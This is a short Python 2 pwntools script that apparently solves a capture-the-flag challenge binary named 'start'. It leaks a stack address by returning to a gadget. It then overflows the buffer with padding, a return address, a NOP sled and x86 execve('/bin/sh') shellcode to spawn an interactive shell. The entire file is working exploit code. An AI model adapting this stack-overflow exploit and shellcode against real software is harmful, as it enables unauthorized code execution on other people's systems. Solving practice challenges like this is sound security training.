#!/usr/bin/python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./start')
print 'pid:' + str(proc.pidof(p))
gdb.attach(p)

def getLeaf():
    p.recv()
    padding1 = 20 * 'a'
    gad = 0x08048087
    payload = padding1 + p32(gad)
    p.send(payload)
    leav = u32(p.recv(4))
    p.recv()
    return leav

padding1 = 20*'a'
gad = getLeaf() + 20
print '$esp = ' + hex(gad-20)
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))
payload = padding1 + p32(gad) + '\x90' * 5+ shellcode
p.send(payload)
print 'Enjoy your shell!'
p.interactive('\nshell>')
